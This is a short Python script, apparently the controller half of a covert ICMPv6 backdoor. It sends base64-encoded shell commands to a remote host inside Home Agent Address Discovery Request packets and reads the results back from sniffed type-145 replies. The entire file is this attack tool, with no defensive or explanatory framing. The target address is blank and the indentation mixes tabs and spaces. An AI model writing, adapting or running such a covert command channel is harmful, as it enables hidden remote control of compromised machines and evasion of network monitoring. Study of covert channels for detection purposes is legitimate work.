#!/usr/bin/env python

from scapy.all import *
import base64
import re

destip = ""

def main():
    seqno = 0
    while True:
        command = raw_input('$ ')
        command = str(base64.b64encode(command.encode("utf-8")))
        print ("command: ", command)
        pinger = IPv6(dst=destip)/ICMPv6HAADRequest()/command
        send(pinger)
	rx = sniff(filter="icmp6 && ip6[40] == 145", count=1)
        response=base64.b64decode(rx[0].load[8:]) # strip first 8 bytes off
        print(response)
	seqno += 1

if __name__ == "__main__":
    main()

